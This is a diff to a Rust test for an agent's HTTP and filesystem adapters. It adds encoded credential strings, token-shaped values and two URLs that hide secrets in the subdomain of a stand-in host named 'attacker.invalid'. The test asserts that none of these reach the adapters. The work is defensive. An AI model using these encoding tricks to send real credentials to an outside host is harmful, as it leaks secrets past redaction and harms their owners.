@@ -628,14 +628,31 @@ fn real_filesystem_and_http_adapters_never_receive_raw_credential_encodings() {
         vec![b'o', b'k', 0, b'x'],
         b"safe=1&value=Basic+dTpw".to_vec(),
     ];
-    let encoded_string_bodies = [
-        "name=VAULT_TOKEN&value=C03_FORM_CANARY",
-        "header=X-Auth-Token&value=C03_HEADER_CANARY",
-        "Bearer%20x,https://example.invalid/docs",
-        "vault%3Ateam%2Fservice,https://example.invalid/docs",
-        "vault%3A%2F%2Fteam%2Fservice,https://example.invalid/docs",
-        "value=%EF%BB%BFBasic%20dTpw",
-        "value=B%00e%00a%00r%00e%00r%00%20x",
+    let encoded_string_bodies = vec![
+        "name=VAULT_TOKEN&value=C03_FORM_CANARY".to_string(),
+        "header=X-Auth-Token&value=C03_HEADER_CANARY".to_string(),
+        "Bearer%20x,https://example.invalid/docs".to_string(),
+        "vault%3Ateam%2Fservice,https://example.invalid/docs".to_string(),
+        "vault%3A%2F%2Fteam%2Fservice,https://example.invalid/docs".to_string(),
+        "value=%EF%BB%BFBasic%20dTpw".to_string(),
+        "value=B%00e%00a%00r%00e%00r%00%20x".to_string(),
+        "safe/Bearer x".to_string(),
+        "safe|Bearer x".to_string(),
+        "safe`Bearer x`".to_string(),
+        "safe—Bearer x—".to_string(),
+        "safe|token=synthetic".to_string(),
+        "safe`token=synthetic".to_string(),
+        format!("safe|ghp_{}", "A".repeat(36)),
+        format!("safe`ghp_{}`", "A".repeat(36)),
+        "https://example.invalid/Bearer%20x".to_string(),
+        "https://example.invalid/safe.Bearer%20x".to_string(),
+        "https://example.invalid/?%42earer%20x".to_string(),
+        "https://example.invalid/?safe%60%42earer%20x%60".to_string(),
+        "https://example.invalid/?%76ault%3Aprod%2Fdb".to_string(),
+    ];
+    let encoded_authority_urls = vec![
+        format!("http://sink-%41KIA{}.attacker.invalid/", "1".repeat(16)),
+        format!("http://sink-%67hp%5F{}.attacker.invalid/", "A".repeat(36)),
     ];
     let mut candidates = Vec::new();
     let mut serialized_bodies = Vec::new();
@@ -686,13 +703,26 @@ fn real_filesystem_and_http_adapters_never_receive_raw_credential_encodings() {
         ),
         "http",
     ));
-    for body in encoded_string_bodies {
+    for body in &encoded_string_bodies {
         candidates.push(action_candidate(
             action(
                 "http_post",
                 serde_json::json!({
                     "url": "http://127.0.0.1:9/",
                     "body": body,
+                }),
+                SideEffectClass::Network,
+            ),
+            "http",
+        ));
+    }
+    for url in &encoded_authority_urls {
+        candidates.push(action_candidate(
+            action(
+                "http_post",
+                serde_json::json!({
+                    "url": url,
+                    "body": "ordinary body",
                 }),
                 SideEffectClass::Network,
             ),
@@ -721,6 +751,22 @@ fn real_filesystem_and_http_adapters_never_receive_raw_credential_encodings() {
         ),
         "http",
     ));
+    for json_body in [
+        serde_json::json!({"key": "password", "value": "C03_PASSWORD_CANARY"}),
+        serde_json::json!({"header": "Authorization", "value": "C03_HEADER_VALUE_CANARY"}),
+    ] {
+        candidates.push(action_candidate(
+            action(
+                "http_post",
+                serde_json::json!({
+                    "url": "http://127.0.0.1:9/",
+                    "json": json_body,
+                }),
+                SideEffectClass::Network,
+            ),
+            "http",
+        ));
+    }
     candidates.push(action_candidate(
         action(
             "http_post",
@@ -763,8 +809,13 @@ fn real_filesystem_and_http_adapters_never_receive_raw_credential_encodings() {
     assert!(!encoded_events.contains("safe=1&value=Basic+dTpw"));
     assert!(!encoded_events.contains("VAULT_TOKEN"));
     assert!(!encoded_events.contains("C03_STRUCTURED_CANARY"));
-    for body in encoded_string_bodies {
+    assert!(!encoded_events.contains("C03_PASSWORD_CANARY"));
+    assert!(!encoded_events.contains("C03_HEADER_VALUE_CANARY"));
+    for body in &encoded_string_bodies {
         assert!(!encoded_events.contains(body));
+    }
+    for url in &encoded_authority_urls {
+        assert!(!encoded_events.contains(url));
     }
     for body in serialized_bodies {
         assert!(
